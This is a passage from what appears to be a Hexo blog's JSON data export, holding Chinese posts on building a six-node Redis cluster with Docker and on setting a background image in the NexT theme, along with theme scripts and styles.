class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli --cluster check 192.168.1.42:6381</span></span><br><span class=\"line\">192.168.1.42:6381 (f999e351...) -&gt; 0 keys | 5461 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6383 (41f99f51...) -&gt; 1 keys | 5461 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6382 (6dca8499...) -&gt; 1 keys | 5462 slots | 1 slaves.</span><br><span class=\"line\">[OK] 2 keys <span class=\"keyword\">in</span> 3 masters.</span><br><span class=\"line\">0.00 keys per slot on average.</span><br><span class=\"line\">&gt;&gt;&gt; Performing Cluster Check (using node 192.168.1.42:6381)</span><br><span class=\"line\">M: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381</span><br><span class=\"line\">   slots:[0-5460] (5461 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">M: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383</span><br><span class=\"line\">   slots:[10923-16383] (5461 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">S: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates f999e35136ec2e61fcceebf182f5c38ef4a4354d</span><br><span class=\"line\">S: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40</span><br><span class=\"line\">S: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda</span><br><span class=\"line\">M: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382</span><br><span class=\"line\">   slots:[5461-10922] (5462 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">[OK] All nodes agree about slots configuration.</span><br><span class=\"line\">&gt;&gt;&gt; Check <span class=\"keyword\">for</span> open slots...</span><br><span class=\"line\">&gt;&gt;&gt; Check slots coverage...</span><br><span class=\"line\">[OK] All 16384 slots covered.</span><br><span class=\"line\">root@knight:/data<span class=\"comment\"># </span></span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li>下载镜像</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull redis:6.0.8</span><br></pre></td></tr></table></figure>","more":"<ol start=\"2\">\n<li>生成容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d --name redis-node-1 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-1:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6381</span><br><span class=\"line\">docker run -d --name redis-node-2 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-2:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6382</span><br><span class=\"line\">docker run -d --name redis-node-3 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-3:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6383</span><br><span class=\"line\">docker run -d --name redis-node-4 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-4:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6384</span><br><span class=\"line\">docker run -d --name redis-node-5 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-5:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6385</span><br><span class=\"line\">docker run -d --name redis-node-6 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-6:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6386</span><br></pre></td></tr></table></figure>\n\n<p>效果展示：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE         COMMAND                  CREATED              STATUS              PORTS     NAMES</span><br><span class=\"line\">61d59245db3d   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   About a minute ago   Up About a minute             redis-node-6</span><br><span class=\"line\">223fad42e069   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   About a minute ago   Up About a minute             redis-node-5</span><br><span class=\"line\">f0055941fe3f   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   About a minute ago   Up About a minute             redis-node-4</span><br><span class=\"line\">e361d9695a0c   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   About a minute ago   Up About a minute             redis-node-3</span><br><span class=\"line\">400119c3015c   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   About a minute ago   Up About a minute             redis-node-2</span><br><span class=\"line\">61e2e38927c4   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   4 minutes ago        Up 4 minutes                  redis-node-1</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>构建主从关系</li>\n</ol>\n<p>随便进入一台容器，在这里使用1号机进行演示。</p>\n<ul>\n<li>进入容器</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it redis-node-1 js 折叠代码</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>建立集群</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster create 192.168.1.42:6381 192.168.1.42:6382 192.168.1.42:6383 192.168.1.42:6384 192.168.1.42:6385 192.168.1.42:6386 --cluster-replicas 1</span><br></pre></td></tr></table></figure>\n\n<p>–cluster-replicas 1 一个主服务器配置一个从服务器。</p>\n<p>之后出现下面这行提示，按要求输入<code>yes</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Can I <span class=\"built_in\">set</span> the above configuration? (<span class=\"built_in\">type</span> <span class=\"string\">&#x27;yes&#x27;</span> to accept): <span class=\"built_in\">yes</span></span><br></pre></td></tr></table></figure>\n\n<p>出现下面的提示代表集群建立完成：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[OK] All nodes agree about slots configuration.</span><br><span class=\"line\">&gt;&gt;&gt; Check <span class=\"keyword\">for</span> open slots...</span><br><span class=\"line\">&gt;&gt;&gt; Check slots coverage...</span><br><span class=\"line\">[OK] All 16384 slots covered.</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>查看集群信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -p 6381</span><br><span class=\"line\">cluster info</span><br><span class=\"line\">cluster nodes</span><br></pre></td></tr></table></figure>\n\n<p>效果展示：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli -p 6381</span></span><br><span class=\"line\">127.0.0.1:6381&gt; cluster info</span><br><span class=\"line\">cluster_state:ok</span><br><span class=\"line\">cluster_slots_assigned:16384</span><br><span class=\"line\">cluster_slots_ok:16384</span><br><span class=\"line\">cluster_slots_pfail:0</span><br><span class=\"line\">cluster_slots_fail:0</span><br><span class=\"line\">cluster_known_nodes:6</span><br><span class=\"line\">cluster_size:3</span><br><span class=\"line\">cluster_current_epoch:6</span><br><span class=\"line\">cluster_my_epoch:1</span><br><span class=\"line\">cluster_stats_messages_ping_sent:335</span><br><span class=\"line\">cluster_stats_messages_pong_sent:315</span><br><span class=\"line\">cluster_stats_messages_sent:650</span><br><span class=\"line\">cluster_stats_messages_ping_received:310</span><br><span class=\"line\">cluster_stats_messages_pong_received:335</span><br><span class=\"line\">cluster_stats_messages_meet_received:5</span><br><span class=\"line\">cluster_stats_messages_received:650</span><br><span class=\"line\"></span><br><span class=\"line\">127.0.0.1:6381&gt; cluster nodes</span><br><span class=\"line\">41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1691914813226 3 connected 10923-16383</span><br><span class=\"line\">849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 slave f999e35136ec2e61fcceebf182f5c38ef4a4354d 0 1691914812223 1 connected</span><br><span class=\"line\">6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1691914811000 2 connected 5461-10922</span><br><span class=\"line\">8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1691914812000 2 connected</span><br><span class=\"line\">9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1691914812000 3 connected</span><br><span class=\"line\">f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,master - 0 1691914809000 1 connected 0-5460</span><br><span class=\"line\">127.0.0.1:6381&gt; </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster check 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<p>换成自己主机的IP，端口号随便是集群的任何一个容器的都可以。</p>\n<p>效果展示：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli --cluster check 192.168.1.42:6381</span></span><br><span class=\"line\">192.168.1.42:6381 (f999e351...) -&gt; 0 keys | 5461 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6383 (41f99f51...) -&gt; 1 keys | 5461 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6382 (6dca8499...) -&gt; 1 keys | 5462 slots | 1 slaves.</span><br><span class=\"line\">[OK] 2 keys <span class=\"keyword\">in</span> 3 masters.</span><br><span class=\"line\">0.00 keys per slot on average.</span><br><span class=\"line\">&gt;&gt;&gt; Performing Cluster Check (using node 192.168.1.42:6381)</span><br><span class=\"line\">M: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381</span><br><span class=\"line\">   slots:[0-5460] (5461 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">M: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383</span><br><span class=\"line\">   slots:[10923-16383] (5461 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">S: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates f999e35136ec2e61fcceebf182f5c38ef4a4354d</span><br><span class=\"line\">S: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40</span><br><span class=\"line\">S: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda</span><br><span class=\"line\">M: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382</span><br><span class=\"line\">   slots:[5461-10922] (5462 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">[OK] All nodes agree about slots configuration.</span><br><span class=\"line\">&gt;&gt;&gt; Check <span class=\"keyword\">for</span> open slots...</span><br><span class=\"line\">&gt;&gt;&gt; Check slots coverage...</span><br><span class=\"line\">[OK] All 16384 slots covered.</span><br><span class=\"line\">root@knight:/data<span class=\"comment\"># </span></span><br></pre></td></tr></table></figure>"},{"title":"设置博客背景图片","date":"2023-07-17T13:02:33.000Z","_content":"\n我一直使用的是Next的主题，这个主题默认是可以自定义一些样式的。\n\n### 添加图片\n\n首先选择一张心仪的背景图片，添加到themes/next/source/images/xx.jpg。我建议图片的大小最好控制一下，最好控制在400k-500K左右，动辄几兆大小的背景图片网页加载起来会很吃力，非常影响实际体验。\n\n<!-- more -->\n\n### 取消注释\n\n然后需要打开这个开关，也就是取消style这个注释\n\n```bash 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  #footer: source/_data/footer.swig\n  #bodyEnd: source/_data/body-end.njk\n  #variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n```\n\n### 创建文件\n\n取消注释以后，创建这样的一个文件source/_data/styles.styl，需要注意的是，这个source是站点目录下的source，而不是主题目录下的source。\n\n创建好之后，在文件插入以下代码：\n\n```bash\nbody {\n  background:url(/images/xx.jpg);\n  background-repeat: no-repeat;\n  background-attachment:fixed;\n  background-position:100% 100%;\n}\n```\n\n* background:url 为图片路径，也可以直接使用链接。\n* background-repeat：若果背景图片不能全屏，那么是否平铺显示，充满屏幕\n* background-attachment：背景是否随着网页上下滚动而滚动，fixed 为固定\n* background-size：图片展示大小，这里设置 100%，100% 的意义为：如果背景图片不能全屏，那么是否通过拉伸的方式将背景强制拉伸至全屏显示。\n\n重新生成一下配置，就会出现效果了。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","source":"_posts/BGPic.md","raw":"---\ntitle: 设置博客背景图片\ndate: 2023-07-17 21:02:33\ncategories: 博客搭建\ntags:\n  - 博客美化\n---\n\n我一直使用的是Next的主题，这个主题默认是可以自定义一些样式的。\n\n### 添加图片\n\n首先选择一张心仪的背景图片，添加到themes/next/source/images/xx.jpg。我建议图片的大小最好控制一下，最好控制在400k-500K左右，动辄几兆大小的背景图片网页加载起来会很吃力，非常影响实际体验。\n\n<!-- more -->\n\n### 取消注释\n\n然后需要打开这个开关，也就是取消style这个注释\n\n```bash 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  #footer: source/_data/footer.swig\n  #bodyEnd: source/_data/body-end.njk\n  #variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n```\n\n### 创建文件\n\n取消注释以后，创建这样的一个文件source/_data/styles.styl，需要注意的是，这个source是站点目录下的source，而不是主题目录下的source。\n\n创建好之后，在文件插入以下代码：\n\n```bash\nbody {\n  background:url(/images/xx.jpg);\n  background-repeat: no-repeat;\n  background-attachment:fixed;\n  background-position:100% 100%;\n}\n```\n\n* background:url 为图片路径，也可以直接使用链接。\n* background-repeat：若果背景图片不能全屏，那么是否平铺显示，充满屏幕\n* background-attachment：背景是否随着网页上下滚动而滚动，fixed 为固定\n* background-size：图片展示大小，这里设置 100%，100% 的意义为：如果背景图片不能全屏，那么是否通过拉伸的方式将背景强制拉伸至全屏显示。\n\n重新生成一下配置，就会出现效果了。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","slug":"BGPic","published":1,"updated":"2024-05-03T03:55:54.713Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5cu00097zj3b56v0k47","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>我一直使用的是Next的主题，这个主题默认是可以自定义一些样式的。</p>\n<h3 id=\"添加图片\"><a href=\"#添加图片\" class=\"headerlink\" title=\"添加图片\"></a>添加图片</h3><p>首先选择一张心仪的背景图片，添加到themes&#x2F;next&#x2F;source&#x2F;images&#x2F;xx.jpg。我建议图片的大小最好控制一下，最好控制在400k-500K左右，动辄几兆大小的背景图片网页加载起来会很吃力，非常影响实际体验。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"取消注释\"><a href=\"#取消注释\" class=\"headerlink\" title=\"取消注释\"></a>取消注释</h3><p>然后需要打开这个开关，也就是取消style这个注释</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">custom_file_path:</span><br><span class=\"line\">  <span class=\"comment\">#head: source/_data/head.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#header: source/_data/header.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#sidebar: source/_data/sidebar.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postMeta: source/_data/post-meta.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#footer: source/_data/footer.swig</span></span><br><span class=\"line\">  <span class=\"comment\">#bodyEnd: source/_data/body-end.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#variable: source/_data/variables.styl</span></span><br><span class=\"line\">  <span class=\"comment\">#mixin: source/_data/mixins.styl</span></span><br><span class=\"line\">  style: <span class=\"built_in\">source</span>/_data/styles.styl</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"创建文件\"><a href=\"#创建文件\" class=\"headerlink\" title=\"创建文件\"></a>创建文件</h3><p>取消注释以后，创建这样的一个文件source&#x2F;_data&#x2F;styles.styl，需要注意的是，这个source是站点目录下的source，而不是主题目录下的source。</p>\n<p>创建好之后，在文件插入以下代码：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">body &#123;</span><br><span class=\"line\">  background:url(/images/xx.jpg);</span><br><span class=\"line\">  background-repeat: no-repeat;</span><br><span class=\"line\">  background-attachment:fixed;</span><br><span class=\"line\">  background-position:100% 100%;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>background:url 为图片路径，也可以直接使用链接。</li>\n<li>background-repeat：若果背景图片不能全屏，那么是否平铺显示，充满屏幕</li>\n<li>background-attachment：背景是否随着网页上下滚动而滚动，fixed 为固定</li>\n<li>background-size：图片展示大小，这里设置 100%，100% 的意义为：如果背景图片不能全屏，那么是否通过拉伸的方式将背景强制拉伸至全屏显示。</li>\n</ul>\n<p>重新生成一下配置，就会出现效果了。</p>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p>已经取消注释的文件对应的功能和教程链接。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">文件</th>\n<th align=\"center\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">footer</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/FlyLine/\">背景”小飞棍”</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">bodyEnd</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">variable</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-fillet/\">设置圆角</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">style</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/BGPic/\">背景图片</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-transparency/\">博客透明度</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n</tbody></table>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 